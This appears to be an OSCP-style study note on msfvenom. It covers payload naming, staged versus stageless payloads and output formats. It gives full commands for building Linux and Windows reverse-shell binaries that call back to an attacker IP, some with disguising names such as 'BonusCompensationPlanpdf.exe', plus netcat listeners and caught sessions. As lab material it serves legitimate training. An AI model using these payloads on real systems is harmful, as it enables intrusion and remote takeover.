# MSFVenom — Payload Basics

## Overview

`msfvenom` is used to generate payloads for different:

- operating systems
- architectures
- shell types
- output formats

Common use cases:

- reverse shells
- bind shells
- Meterpreter payloads
- payload generation for lab exploitation
- creating payload files for testing in controlled environments

---

## Quick Workflow

1. list available payloads
2. choose OS + architecture + shell type
3. set callback IP and port
4. choose output format
5. generate payload
6. deliver payload to target
7. start listener
8. catch shell

---

# 1. Listing Payloads

## Show All Payloads

```bash
msfvenom -l payloads
```

This lists available payloads such as:

- Linux reverse shells
- Windows reverse shells
- bind shells
- Meterpreter payloads
- staged and stageless variants

---

## Example Payloads

```text
linux/x86/shell/reverse_tcp
linux/x86/shell_reverse_tcp
windows/meterpreter/reverse_tcp
windows/meterpreter_reverse_tcp
```

---

# 2. Understanding Payload Naming

Payload names usually tell you:

- target OS
- architecture
- shell type
- transport type
- staged vs stageless

---

## Naming Pattern

Example:

```text
linux/x64/shell_reverse_tcp
```

Breakdown:

| Part | Meaning |
|------|---------|
| `linux` | target OS |
| `x64` | architecture |
| `shell_reverse_tcp` | reverse shell over TCP |

---

## Another Example

```text
windows/meterpreter/reverse_tcp
```

Breakdown:

| Part | Meaning |
|------|---------|
| `windows` | target OS |
| `meterpreter` | shell / session type |
| `reverse_tcp` | transport |

---

# 3. Staged vs Stageless Payloads

## Staged Payloads

Example:

```text
windows/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
```

### What it means
A small first stage runs first, then retrieves the rest of the payload.

### Characteristics
- smaller initial delivery size
- requires follow-up network communication
- can be less stable on slow/restricted links

---

## Stageless Payloads

Example:

```text
windows/meterpreter_reverse_tcp
linux/x64/shell_reverse_tcp
```

### What it means
The full payload is sent in one piece.

### Characteristics
- no second stage download
- often more stable in unreliable networks
- simpler payload flow

---

## Quick Rule

| Pattern | Type |
|---------|------|
| `shell/reverse_tcp` | staged |
| `shell_reverse_tcp` | stageless |
| `meterpreter/reverse_tcp` | staged |
| `meterpreter_reverse_tcp` | stageless |

A slash-separated shell + transport often indicates **staged**.  
A combined name often indicates **stageless**.

---

# 4. Building a Linux Stageless Payload

## Example

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

---

## Breakdown

| Part | Meaning |
|------|---------|
| `msfvenom` | tool |
| `-p` | payload selection |
| `linux/x64/shell_reverse_tcp` | payload type |
| `LHOST=10.10.14.113` | callback IP |
| `LPORT=443` | callback port |
| `-f elf` | output as ELF binary |
| `> createbackup.elf` | write payload to file |

---

## Typical Output

```text
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

---

# 5. Catching the Linux Reverse Shell

Start a listener on the attack box:

```bash
sudo nc -lvnp 443
```

If the payload executes successfully, you should receive a shell.

---

## Example Session

```text
Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
```

Basic commands:

```bash
env
pwd
ls
whoami
```

---

# 6. Building a Windows Stageless Payload

## Example

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

---

## Breakdown

| Part | Meaning |
|------|---------|
| `windows/shell_reverse_tcp` | Windows reverse shell payload |
| `LHOST` | callback IP |
| `LPORT` | callback port |
| `-f exe` | output Windows executable |

---

## Typical Output

```text
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

---

# 7. Catching the Windows Reverse Shell

Start listener:

```bash
sudo nc -lvnp 443
```

If the executable runs and callback succeeds, you may get a Windows shell.

---

## Example Session

```text
Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
```

Basic checks:

```cmd
whoami
hostname
dir
```

---

# 8. Common Output Formats

| Format | Use Case |
|--------|----------|
| `elf` | Linux executable |
| `exe` | Windows executable |
| `raw` | raw shellcode |
| `asp` / `aspx` | web payload formats |
| `war` | Java web archive |
| `psh` | PowerShell output |
| `c` | C-style shellcode |
| `python` | Python format |
| `hta` | HTA payload format |

---

## List Formats

```bash
msfvenom -l formats
```

---

# 9. Common Payload Types

| Payload | Purpose |
|---------|---------|
| `shell_reverse_tcp` | reverse shell |
| `shell_bind_tcp` | bind shell |
| `meterpreter/reverse_tcp` | staged Meterpreter |
| `meterpreter_reverse_tcp` | stageless Meterpreter |
| `cmd/unix/reverse_netcat` | Unix command shell via netcat |
| `cmd/windows/reverse_powershell` | PowerShell reverse shell |

---

# 10. Useful Lab Commands

## List payloads

```bash
msfvenom -l payloads
```

## List formats

```bash
msfvenom -l formats
```

## Linux reverse shell

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf > shell.elf
```

## Windows reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe > shell.exe
```

## Start listener

```bash
nc -lvnp 443
```

---

# 11. Staged vs Stageless Summary

| Type | Example | Notes |
|------|---------|------|
| Staged | `windows/meterpreter/reverse_tcp` | small first stage, fetches remainder |
| Stageless | `windows/meterpreter_reverse_tcp` | sent all at once |
| Staged | `linux/x86/shell/reverse_tcp` | slash-separated shell stages |
| Stageless | `linux/x64/shell_reverse_tcp` | shell + transport combined |

---

# 12. Practical Notes

- always match payload to target OS and architecture
- make sure `LHOST` is reachable from target
- choose `LPORT` that is likely allowed through the environment
- stageless payloads are often simpler and more stable in labs
- if using reverse payloads, have your listener ready first
- verify whether you need a raw shell or Meterpreter for the task

---

# 13. Common Pitfalls

- wrong architecture (`x86` vs `x64`)
- wrong callback IP
- wrong callback port
- no listener running
- firewall blocking callback
- using staged payload where second stage cannot be retrieved
- wrong output format for target platform

---

# Cheatsheet

## List options

```bash
msfvenom -l payloads
msfvenom -l formats
```

## Linux payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > payload.elf
```

## Windows payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > payload.exe
```

## Catch shell

```bash
nc -lvnp 443
```

## Staged examples

```text
windows/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
```

## Stageless examples

```text
windows/meterpreter_reverse_tcp
linux/x64/shell_reverse_tcp
```

---

# Tags

#shells #payloads #msfvenom #reverse-shell #meterpreter #linux #windows #oscp